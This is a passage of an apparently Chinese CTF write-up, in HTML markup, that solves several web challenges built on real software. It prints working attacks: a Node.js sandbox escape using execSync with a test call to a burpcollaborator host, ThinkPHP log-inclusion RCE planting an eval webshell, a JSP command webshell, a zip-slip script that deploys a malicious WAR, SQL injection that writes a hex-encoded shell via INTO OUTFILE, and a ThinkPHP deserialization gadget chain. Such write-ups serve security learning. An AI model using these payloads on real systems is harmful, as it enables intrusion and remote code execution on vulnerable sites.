&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731153231688.png" alt="image-20210731153231688">&lt;/p>
&lt;p>之后修改全局mock脚本&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">ObjectConstructor&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">FunctionConstructor&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ObjectConstructor&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">myfun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">FunctionConstructor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;return process&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">process&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">myfun&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">mockjson&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mainModule&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">execSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;command&amp;#34;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后添加接口&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731154705721.png" alt="image-20210731154705721">&lt;/p>
&lt;p>脚本中的execSync()处可rce，先用&lt;code>wget http://xxxxx.burpcollaborator.net&lt;/code>试试水&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210731154732738.png" alt="image-20210731154732738">&lt;/p>
&lt;p>很顺利嘛 好耶！&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">cat &lt;span style="color:#d88200">`&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // spawnSync /bin/sh ENOBUFS
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../&lt;span style="color:#111">;&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // config.json, init.lock, log, vendors
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // app, bin, boot, dev, etc, ffffffflllllaggggg, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, start.sh, tmp, usr, var
&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>cat &lt;span style="color:#d88200">`&lt;/span>ls&lt;span style="color:#d88200">`&lt;/span> // app, bin,boot, dev, etc, home, lib, lib64, media, mnt,opt, proc, root, run, sbin, srv, sys, tmp, usr, var
cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;/span> ../../&lt;span style="color:#111">;&lt;/span>cat ffffffflllllaggggg&lt;span style="color:#d88200">`&lt;/span> // flag&lt;span style="color:#f92672">{&lt;/span>5d096f4f-8c32-49b6-bed4-b485eb1cf08b&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="easythinkphp">easythinkphp&lt;/h2>
&lt;blockquote>
&lt;p>easythinkphp&lt;/p>
&lt;/blockquote>
&lt;p>只有一个thinkphp 3.2.3的欢迎页面，tp的洞很多 可以直接拿来打，参考：&lt;a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">【漏洞通报】ThinkPHP3.2.x RCE漏洞通报&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=phpinfo();?&amp;gt;
/index.php?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801011103992.png" alt="image-20210801011103992">&lt;/p>
&lt;p>先验证一下文档中的方法，成功，之后把phpinfo换成自己的一句话木马&lt;/p>
&lt;pre tabindex="0">&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=eval($_POST['wuhu']);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>传入后 用蚁剑连接就能拿flag了~&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801012307515.png" alt="image-20210801012307515">&lt;/p>
&lt;p>或者也可以直接使用&lt;a href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.2">ThinkphpGUI&lt;/a>一把梭！一键getshell 你值得拥有&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803170035307.png" alt="image-20210803170035307">&lt;/p>
&lt;h2 id="jspxcms">jspxcms&lt;/h2>
&lt;p>也有现成的洞可以直接用，参考：&lt;a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">复现jspxcms解压getshell漏洞&lt;/a> | &lt;a href="https://www.shengchulai.com/blog-NJwAv8oZV1.htm">代码审计| Jspxcms文件上传漏洞(CNVD-2019-40540)&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/188788">记一次由追踪溯源发现的“不安全解压getshell”&lt;/a>&lt;/p>
&lt;p>首先构造含jsp🐎的恶意war包，🐎长这样&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%
if(&amp;quot;023&amp;quot;.equals(request.getParameter(&amp;quot;pwd&amp;quot;))){
java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&amp;quot;wuhu&amp;quot;)).getInputStream();
int a = -1;
byte[] b = new byte[2048];
out.print(&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;);
while((a=in.read(b))!=-1){
out.println(new String(b));
}
out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);
}
%&amp;gt;
&lt;/code>&lt;/pre>&lt;p>之后放入一个解压后会自动完成目录穿越的zip包中 这个过程由py脚本完成&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">binary&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;script&amp;gt;alert(&amp;#34;helloworld&amp;#34;)&amp;lt;/script&amp;gt;&amp;#39;&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test123.zip&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZIP_DEFLATED&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipInfo&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test123.zip&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">writestr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;../../../../dog123.html&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">binary&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">zipFile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">IOError&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">e&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>
&lt;span style="color:#111">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZipFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test123.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ZIP_DEFLATED&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;wuhu.war&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">z&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">writestr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;../../../../wuhu.war&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">z&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>需要注意的是 最终我们要穿越到的目录是网站根目录的上层，即webapps目录下 与ROOT目录同级，当war包位于这个目录下才会自动部署&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801013622428.png" alt="image-20210801013622428">&lt;/p>
&lt;p>直接&lt;code>cat /flag&lt;/code>就好啦&lt;/p>
&lt;h2 id="cybercms">cybercms&lt;/h2>
&lt;blockquote>
&lt;p>赛博CMS，只为安全而生&lt;/p>
&lt;p>Hint：信息搜集是一个web手必备的技能&lt;/p>
&lt;/blockquote>
&lt;p>一个（伪）cms平台介绍的页面，比较简陋，首页/应用案例处显示hacked by ymnh，在ymnh的咨询页面处有这样的报错&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801031306740.png" alt="image-20210801031306740">&lt;/p>
&lt;p>在首页/新闻动态处，几乎所有的帖子都是hacked by xxx~~（本来我还以为是多么复杂的长篇大论）~~，在如何安装和使用模板这篇下有没删干净的东西&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801031809386.png" alt="image-20210801031809386">&lt;/p>
&lt;p>如何设置进站语言这篇里竟然是这样的&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801032406665.png" alt="image-20210801032406665">&lt;/p>
&lt;p>草 真是蚌埠住了 图穷匕见了属于是2333333&lt;/p>
&lt;p>根据这些，可以得知整个站是完全移植/套壳beescms的 所以接着去找已存在的洞，参考：&lt;a href="https://www.cnblogs.com/yuzly/p/11423384.html">Beescms_v4.0 sql注入漏洞分析&lt;/a>&lt;/p>
&lt;p>在admin后加单引号，提示&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801113627407.png" alt="image-20210801113627407">&lt;/p>
&lt;p>表名是bees_admin，有id, admin_name, admin_password, admin_purview, is_disable共5个字段&lt;/p>
&lt;p>简单fuzz可知：过滤了空格（用&lt;code>/**/&lt;/code>绕过）（或者用&lt;code>tab&lt;/code>绕过 或者&lt;code>%0a&lt;/code>绕过 都可以），过滤了select, outfile（双写绕过），对尖括号转义为html实体（用hex绕过）&lt;/p>
&lt;pre tabindex="0">&lt;code>user=admin'/**/union/**/selselectect/**/1,2,3,4,5#
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121138555.png" alt="image-20210801121138555">&lt;/p>
&lt;p>回显正常，接着尝试写入shell（这里要写清楚绝对路径，在上面的一张报错的页面也有所提示了）&lt;/p>
&lt;pre tabindex="0">&lt;code>admin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'#
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121645243.png" alt="image-20210801121645243">&lt;/p>
&lt;p>好耶，连蚁剑拿flag咯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121853464.png" alt="image-20210801121853464">&lt;/p>
&lt;h2 id="ez_website">ez_website&lt;/h2>
&lt;blockquote>
&lt;p>简单的题目&lt;/p>
&lt;/blockquote>
&lt;p>也是现实世界存在的东西，参考：&lt;a href="https://ma4ter.cn/2527.html">齐博建站系统x1.0代码审计&lt;/a>&lt;/p>
&lt;p>直接用已有的链子打&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\process\pipes&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Windows&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$files&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#75715e">//$file =&amp;gt; /think/Model的子类new Pivot(); Model是抽象类
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$append&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$error&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$parent&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">parent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$this-&amp;gt;parent=&amp;gt; think\console\Output;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">append&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;xxx&amp;#34;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#34;getError&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">//调用getError 返回this-&amp;gt;error
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">error&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $this-&amp;gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&amp;gt;&amp;gt;HasOne
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Pivot&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">parent&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$modelRelation&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model\relation&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HasOne&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#75af00">OneToOne&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\model\relation&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OneToOne&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$selfRelation&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$bindAttr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">selfRelation&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$query指向Query
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">bindAttr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxx&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>&lt;span style="color:#75715e">// $value值，作为call函数引用的第二变量
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\db&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Query&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">model&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$model&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$this-&amp;gt;model=&amp;gt; think\console\Output;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\console&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Output&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$styles&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">styles&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;getAttr&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$handle-&amp;gt;think\session\driver\Memcached
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\session\driver&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcached&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handler&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//$handle-&amp;gt;think\cache\driver\File
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">think\cache\driver&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">File&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
